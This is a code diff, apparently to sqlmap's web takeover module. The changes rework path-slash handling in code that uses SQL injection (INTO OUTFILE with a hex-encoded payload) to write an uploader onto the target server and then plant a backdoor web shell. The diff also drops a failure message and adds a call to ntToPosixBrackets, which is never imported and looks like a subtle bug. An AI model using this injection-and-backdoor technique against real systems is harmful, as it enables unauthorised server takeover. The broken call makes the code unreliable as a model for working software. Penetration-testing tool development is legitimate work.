@@ -31,8 +31,10 @@ from lib.core.common import decloakToNamedTemporaryFile
 from lib.core.common import fileToStr
 from lib.core.common import getDirs
 from lib.core.common import getDocRoot
+from lib.core.common import ntToPosixSlashes
 from lib.core.common import isWindowsPath
 from lib.core.common import normalizePath
+from lib.core.common import posixToNtSlashes
 from lib.core.common import readInput
 from lib.core.convert import hexencode
 from lib.core.data import conf
@@ -90,6 +92,7 @@ class Web:
                                 "file":      stream,
                                 "uploadDir": directory,
                               }
+                              
             page = Request.getPage(url=self.webUploaderUrl, multipart=multipartParams)
 
             if "File uploaded" not in page:
@@ -174,7 +177,7 @@ class Web:
         for directory in directories:
             # Upload the uploader agent
             outFile     = normalizePath("%s/%s" % (directory, uploaderName))
-            uplQuery    = uploaderContent.replace("WRITABLE_DIR", directory)
+            uplQuery    = uploaderContent.replace("WRITABLE_DIR", directory.replace('/', '\\\\') if kb.os == "Windows" else directory)
             query       = " LIMIT 1 INTO OUTFILE '%s' " % outFile
             query      += "LINES TERMINATED BY 0x%s --" % hexencode(uplQuery)
             query       = agent.prefixQuery(" %s" % query)
@@ -182,13 +185,13 @@ class Web:
             payload     = agent.payload(newValue=query)
             page        = Request.queryPage(payload)
             
-            requestDir  = directory.replace('\\', '/').replace(kb.docRoot.replace('\\', '/'), "/").replace("//", "/")
+            requestDir  = ntToPosixSlashes(directory).replace(ntToPosixBrackets(kb.docRoot), "/").replace("//", "/")
             if isWindowsPath(requestDir):
                 requestDir = requestDir[2:]
             requestDir  = normalizePath(requestDir)
             self.webBaseUrl     = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, requestDir)
             self.webUploaderUrl = "%s/%s" % (self.webBaseUrl, uploaderName)
-            self.webUploaderUrl = self.webUploaderUrl.replace("./", "/").replace("\\", "/")
+            self.webUploaderUrl = ntToPosixSlashes(self.webUploaderUrl.replace("./", "/"))
             uplPage, _  = Request.getPage(url=self.webUploaderUrl, direct=True, raise404=False)
 
             if "sqlmap file uploader" not in uplPage:
@@ -201,18 +204,16 @@ class Web:
             infoMsg  = "the uploader agent has been successfully uploaded "
             infoMsg += "on '%s'" % directory
             logger.info(infoMsg)
-
+            
+            if kb.os == "Windows":
+                directory = posixToNtSlashes(directory)
+            
             if self.__webFileStreamUpload(backdoorStream, backdoorName, directory):
                 self.webBackdoorUrl = "%s/%s" % (self.webBaseUrl, backdoorName)
                 self.webDirectory = directory
-    
                 infoMsg  = "the backdoor has probably been successfully "
                 infoMsg += "uploaded on '%s', go with your browser " % directory
                 infoMsg += "to '%s' and enjoy it!" % self.webBackdoorUrl
                 logger.info(infoMsg)
-            else:
-                infoMsg  = "the backdoor hasn't been successfully "
-                infoMsg += "uploaded on '%s'" % directory
-                logger.warn(infoMsg)
 
             break
